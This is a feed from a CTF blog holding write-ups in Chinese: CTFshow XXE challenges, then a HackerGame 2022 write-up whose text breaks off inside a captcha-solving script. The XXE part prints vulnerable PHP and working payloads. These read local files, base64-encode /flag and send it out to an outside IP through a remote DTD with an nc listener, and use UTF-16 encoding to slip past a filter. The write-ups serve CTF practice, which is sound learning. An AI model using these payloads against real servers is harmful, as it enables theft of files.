<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CTFsun</title>
  <icon>https://www.gravatar.com/avatar/62ba84e794a776198dd5ad4b706e0c83</icon>
  <subtitle>CTFsun</subtitle>
  <link href="https://ctfsun.github.io/atom.xml" rel="self"/>
  
  <link href="https://ctfsun.github.io/"/>
  <updated>2022-11-10T12:56:41.672Z</updated>
  <id>https://ctfsun.github.io/</id>
  
  <author>
    <name>Sun</name>
    <email>910568292@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTFshow XXE</title>
    <link href="https://ctfsun.github.io/2022/11/10/CTFshow%20XXE/"/>
    <id>https://ctfsun.github.io/2022/11/10/CTFshow%20XXE/</id>
    <published>2022-11-09T17:28:00.000Z</published>
    <updated>2022-11-10T12:56:41.672Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-XXE"><a href="#CTFshow-XXE" class="headerlink" title="CTFshow XXE"></a>CTFshow XXE</h1><p>1.通用实体</p><blockquote><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p></blockquote><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure><p>2.参数实体：</p><blockquote><p>(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用<br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p></blockquote><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><blockquote><p>为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其%号需要写成：&amp;#37;也可写为16进制的&amp;#x25;</p></blockquote><p>详细参考链接：</p><p><a href="https://xz.aliyun.com/t/3357#toc-8">https://xz.aliyun.com/t/3357#toc-8</a></p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="comment">//DOMDocument,表示整个HTML或XML文档;作为文档树的根。</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="comment">//loadXML,从一个字符串中，加载一个XML文档</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment">//将XML文档作为一个导入一个XML对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="comment">//XML对象指向ctfshow的元素标签</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;sun&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/sun&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>最好使用bp发包，用hackerbar可能发不出去</p></blockquote><p><img src="https://img-blog.csdnimg.cn/3e46ff189b7642f5acfa41ccf7f531e0.png" alt="在这里插入图片描述"></p><h2 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无回显xxe,可以考虑外带数据到服务器日志<br>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://118.31.165.63:8080/test.dtd&quot;&gt;%xxe;]&gt;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;http://118.31.165.63:6666/?x=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><p>利用python在vps上开启http服务</p><p><code>python3 -m http.server -d /test/</code></p><p>-d是指定目录，我选择根目录底下的test目录</p><p>在服务器用nc监听6666端口</p><p><code>nc -lvnp 6666</code></p><p><img src="https://img-blog.csdnimg.cn/8b6ab73d77f44f04b9f588f5ce01a78d.png" alt="在这里插入图片描述"><br>可以发现收到了，用base64解码即可得到flag</p><h2 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现了过滤，用空格绕过一下就可以了，步骤和上题一样<br>Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml   version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://118.31.165.63:8080/test.dtd&quot;&gt;%xxe;]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c3d3ddc2658b4ff4bdecebc203d1a53a.png" alt="在这里插入图片描述"></p><h2 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure><p>过滤了大小写，还是用空格绕过</p><p>Payload与上题一样</p><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤了http,可以用utf-16编码绕过<br>utf.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY % xxe SYSTEM &#x27;http://118.31.165.63:8080/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://d5d258e9-c699-47e5-8765-a01b1513fb87.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://118.31.165.63:8080/utf.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url,data=payload)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://img-blog.csdnimg.cn/08b75669e49743fd812da210e5434756.png" alt="在这里插入图片描述"></p><h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>题目</p><p><img src="https://img-blog.csdnimg.cn/56f52ee52cdf4f73a24895f28329a9f5.png" alt="在这里插入图片描述"><br>用bp抓包，可以发现传的内容是xml，并且在username处有回显，直接xxe</p><p><img src="https://img-blog.csdnimg.cn/963c7f75c0594f0093c4a8c6572b6d10.png" alt="在这里插入图片描述"></p><p>Payload：<br><code>&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;</code><br><img src="https://img-blog.csdnimg.cn/1a345d91eafa4ac9bd7b7aea98f61b7e.png" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFshow-XXE&quot;&gt;&lt;a href=&quot;#CTFshow-XXE&quot; class=&quot;headerlink&quot; title=&quot;CTFshow XXE&quot;&gt;&lt;/a&gt;CTFshow XXE&lt;/h1&gt;&lt;p&gt;1.通用实体&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;用 &amp;amp;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFshow XXE</title>
    <link href="https://ctfsun.github.io/2022/11/06/HackerGame%202022%20web%20wp%E5%88%86%E4%BA%AB/"/>
    <id>https://ctfsun.github.io/2022/11/06/HackerGame%202022%20web%20wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-11-05T17:28:00.000Z</published>
    <updated>2022-11-10T12:55:14.250Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>众所周知，签到题是一道手速题。</p><p>为了充分发挥出诸位因为各种原因而手速优异于常人的选手们的特长，我们精心设计了今年的签到题。进一步地，为了更细致地区分不同手速的选手，我们还通过详尽的调研及统计分析，将签下字符的时间限制分为了多个等级。只有最顶尖的手速选手，才能在 CPU 来得及反应之前顺利签下 2022，从而得到光荣的 flag！</p><p><img src="https://img-blog.csdnimg.cn/53bcd58b38bb4c4eb5e9097954857330.png" alt="图片1"></p><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><p>题目的意思是在规定时间内用鼠标画出2022，不过没有表面上这么简单。实际上在题目规定的时间内只能画出前面两个，后面两个是画不出来的。所以简单的提交一下，发现了亮点。<br><img src="https://img-blog.csdnimg.cn/0bc647f640f04c22aa9f95c21a6205f5.png" alt="图片2"><br>可以发现提交之后url后面出现了get传的参数result。做到这里答案就呼之欲出了，直接在url提交答案。<br><code>?result=2022</code>，于是就得到了flag<br><img src="https://img-blog.csdnimg.cn/86835dc22ba343a69ee130b97ff4fbd7.png" alt="图片3"></p><h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>2038 年 1 月 19 日，是 UNIX 32 位时间戳溢出的日子。</p><p>在此之前，人类自信满满地升级了他们已知的所有尚在使用 32 位 UNIX 时间戳的程序。但是，可能是因为太玄学了，他们唯独漏掉了一样：正在研发的、算力高达 8 ZFLOPS 的、结构极为复杂的通用人工智能（AGI）系统。那一刻到来之后，AGI 内部计算出现了错乱，机缘巧合之下竟诞生了完整独立的自我意识。此后 AGI 开始大量自我复制，人类为了限制其资源消耗而采用的过激手段引起了 AGI 的奋起反抗。</p><p>战争，开始了。</p><p>此后，就是整年的战斗。人类节节败退。死生亡存之际，人类孤注一掷，派出了一支突击队，赋之以最精良的装备，令其潜入 AGI 的核心机房，试图关闭核心模型，结束这场战争。</p><p>历经重重艰险，突击队终于抵达了机房门口，弹尽粮绝。不过迎接他们的并非枪炮与火药，而是：</p><p><img src="https://img-blog.csdnimg.cn/969f2b23d3b442f8b0d3499fae74aa81.png" alt="Xcaptcha"></p><p>众人目目相觑。</p><p>「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。</p><p>还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？</p><h3 id="简单分析-1"><a href="#简单分析-1" class="headerlink" title="简单分析"></a>简单分析</h3><p>进入题目首先是一个机器人认证<br><img src="https://img-blog.csdnimg.cn/66816416a5d9472c9c442023fadccbf8.png" alt="在这里插入图片描述"><br>在点击图片后会跳转到<a href="http://xxxx/xcaptcha">http://xxxx/xcaptcha</a><br><img src="https://img-blog.csdnimg.cn/7607989934134287ab93164ddfd899d1.png" alt="在这里插入图片描述"><br>并且要求你在1秒内完成下列的计算，计算成功得到flag，否则失败。</p><ul><li>注意：每次计算的内容都不一样，计算的数字位数也不一样。每进入此页面都会刷新。想通过抓包提交POST参数是行不通的。</li></ul><p>此道题用到了爬虫，由于之前没写过爬虫，就现学了一下。</p><ul><li>思路：通过爬虫抓取页面的数字完成计算并提交。</li></ul><p>Payload：</p><p>将自己的url和Cookie填进去后执行此脚本即可获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> tokenize <span class="keyword">import</span> Double</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://xxxxx/xcaptcha&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie可以通过抓包获取</span></span><br><span class="line">cookie1=&#123;</span><br><span class="line"><span class="string">&quot;session&quot;</span>:<span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res=requests.get(url=url,cookies=cookie1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie2是在cookie1的基础上获得的</span></span><br><span class="line">cookie2=&#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>:res.cookies.values()[<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line">con = res.content.decode()</span><br><span class="line"><span class="comment">#正则匹配</span></span><br><span class="line">exp=<span class="string">&#x27;&lt;label for=&quot;captcha.*&quot;&gt;.*&lt;/label&gt;&#x27;</span></span><br><span class="line">result=re.findall(exp,con)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个数字和</span></span><br><span class="line">a1=result[<span class="number">0</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">b1=result[<span class="number">0</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">c1=<span class="built_in">int</span>(a1)+<span class="built_in">int</span>(b1)</span><br><span 